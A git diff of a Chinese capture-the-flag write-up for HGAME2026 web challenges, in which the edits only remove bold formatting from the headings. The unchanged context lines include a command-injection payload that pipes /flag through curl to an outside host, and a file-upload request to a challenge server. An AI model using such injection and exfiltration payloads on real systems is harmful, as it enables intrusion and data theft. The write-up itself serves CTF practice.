@@ -8,7 +8,7 @@ excerpt: 部分题目复现
 
 # HGAME2026 web复现
 
-## **MyMonitor**
+## MyMonitor
 
 GO语言代码审计 + 对象池污染
 
@@ -89,7 +89,7 @@ Content-Length: 69
 {"args":"&& cat /flag | curl -d @- http://114.51.419.198:10"}
 ```
 
-## **easyuu**
+## easyuu
 
 抓包发现`/api/list_dir`接口下可以实现目录查看
 
@@ -207,7 +207,7 @@ files=[
 requests.post('http://forward.vidar.club:31296/api/upload_file', files=files)
 ```
 
-## **baby-web?**
+## baby-web?
 
 附件中指出能上传php文件
 
@@ -263,7 +263,7 @@ if(isset($_POST["submit"])) {
 
 ![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=OWYyMzgyYmZjNDIyYjIwOTIxYmMyNWFlZGZkYWVlOGJfY0VyVzZROGtOZ3hXWWwyejhHNUhybFFwQzBSM0dhWU5fVG9rZW46TVJ6T2JEWHZsbzJqU0d4M1Z4d2NwZ3FJblJkXzE3NzIyOTk3MzA6MTc3MjMwMzMzMF9WNA)
 
-## **魔理沙的魔法目录**
+## 魔理沙的魔法目录
 
 在开发者工具的网络流中发现`record`的api,抓包修改`time`字段
 
@@ -334,7 +334,7 @@ if(isset($_POST["submit"])) {
 
 ![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=ODVjMmNiOTUzYTJjY2VmODcxNzZjMDQ1Yjk2MTg5YjVfTm9jc2F5QjN4ZENZNm5aMnY3OGZoTXM3MzROb203R1pfVG9rZW46RU5JR2JmSklQbzVuZUl4eFpSYWMzZnZzbmdkXzE3NzIyOTk3MzA6MTc3MjMwMzMzMF9WNA)
 
-## **My Little Assistant**
+## My Little Assistant
 
 能访问网页并且回显响应信息
 
@@ -358,7 +358,7 @@ if(isset($_POST["submit"])) {
 
 ![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=ZWZkMjA5ZGY0OTZhNTNiYzJlYzViYTkyZDY5Mzg5ZmZfR2tWNWo0ZnYyV0Y4Um1xV2JnR3N1SXp2YUFFeWdTNEhfVG9rZW46VUlPd2JMQ1Vsb0lpSlV4QnBkVmNVM25ObkFlXzE3NzIyOTk3MzA6MTc3MjMwMzMzMF9WNA)
 
-## **《文文。新闻》**
+## 《文文。新闻》
 
 ```JavaScript
 import http from 'http';
@@ -857,3 +857,4 @@ request.interceptors.response.use(response => {
 export default request;
 
 ```
+
